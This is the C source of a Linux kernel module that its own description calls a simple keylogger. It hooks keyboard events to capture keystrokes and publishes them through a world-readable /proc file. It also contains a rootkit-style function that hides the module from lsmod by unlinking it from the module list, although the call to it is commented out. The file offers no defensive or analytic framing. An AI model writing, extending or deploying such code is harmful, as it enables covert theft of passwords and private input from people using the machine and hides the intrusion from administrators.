#include "keylogger.h"

/**
 * @brief Notifier block structure for keyboard notifications.
 */
struct notifier_block nb;

/**
 * @brief Buffer to store captured keystrokes.
 */
char key_buffer[MAX_BUFFER_SIZE];

/**
 * @brief Pointer to the proc file entry.
 */
struct proc_dir_entry *proc_file;

/**
 * @brief Spinlock for synchronizing access to the key buffer.
 */
spinlock_t lock;

/**
 * @brief Flag to indicate if the module is hidden.
 */
static bool is_hidden = false;

/**
 * @brief Notifier function for keyboard events.
 * 
 * This function is called on keyboard events. It captures the keystrokes
 * when a key is pressed and stores the corresponding character in the
 * key buffer.
 * 
 * @param nb Pointer to the notifier block.
 * @param action Action code indicating the type of event.
 * @param data Pointer to additional data (keyboard notifier parameters).
 * 
 * @return int NOTIFY_OK to indicate successful notification handling.
 */
int keylogger_notify(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = (struct keyboard_notifier_param *)data;

    if (action == KBD_KEYSYM && param->down) {
        char key = (char)param->value;
        spin_lock(&lock);
        key_buffer[0] = key;
        key_buffer[1] = '\0';
        spin_unlock(&lock);
    }

    return NOTIFY_OK;
}

/**
 * @brief Read function for the proc file.
 * 
 * This function is called when the proc file is read. It copies the contents
 * of the key buffer to the user space buffer and clears the key buffer.
 * 
 * @param file Pointer to the file structure.
 * @param ubuf Pointer to the user space buffer.
 * @param count Number of bytes to read.
 * @param ppos Pointer to the current position in the file.
 * 
 * @return ssize_t Number of bytes read, or an error code.
 */
ssize_t procfile_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos) {
    int len;
    spin_lock(&lock);
    len = strnlen(key_buffer, MAX_BUFFER_SIZE);
    if (*ppos > 0 || count < len) {
        spin_unlock(&lock);
        return 0;
    }
    if (copy_to_user(ubuf, key_buffer, len)) {
        spin_unlock(&lock);
        return -EFAULT;
    }
    *ppos = len;
    key_buffer[0] = '\0'; // Clear the buffer after reading
    spin_unlock(&lock);
    return len;
}

/**
 * @brief File operations structure for the proc file.
 * 
 * This structure defines the file operations for the proc file, including
 * the read function.
 */
static const struct file_operations proc_fops = {
    .owner = THIS_MODULE,
    .read = procfile_read,
};

/**
 * @brief Hide the kernel module.
 * 
 * This function hides the module from the list of loaded modules and
 * removes its kobject, making it invisible to tools like lsmod.
 */
void hide_module(void) {
    if (is_hidden) return;
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    is_hidden = true;
    printk(KERN_INFO "Module hidden\n");
}

/**
 * @brief Initialize the keylogger module.
 * 
 * This function registers the keyboard notifier, initializes the spinlock,
 * and creates the proc file entry. It also optionally hides the module.
 * 
 * @return int 0 on success, negative error code on failure.
 */
int __init keylogger_init(void) {
    nb.notifier_call = keylogger_notify;
    register_keyboard_notifier(&nb);
    spin_lock_init(&lock);
    proc_file = proc_create(PROCFS_NAME, 0666, NULL, &proc_fops);
    if (!proc_file) {
        unregister_keyboard_notifier(&nb);
        printk(KERN_ALERT "Error creating /proc/%s\n", PROCFS_NAME);
        return -ENOMEM;
    }
    printk(KERN_INFO "/proc/%s created\n", PROCFS_NAME);
    //hide_module();
    return 0;
}

/**
 * @brief Cleanup function for the keylogger module.
 * 
 * This function removes the proc file entry and unregisters the keyboard notifier.
 */
void __exit keylogger_exit(void) {
    remove_proc_entry(PROCFS_NAME, NULL);
    unregister_keyboard_notifier(&nb);
    printk(KERN_INFO "/proc/%s removed\n", PROCFS_NAME);
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("aviv");
MODULE_DESCRIPTION("A simple keylogger module with procfs");
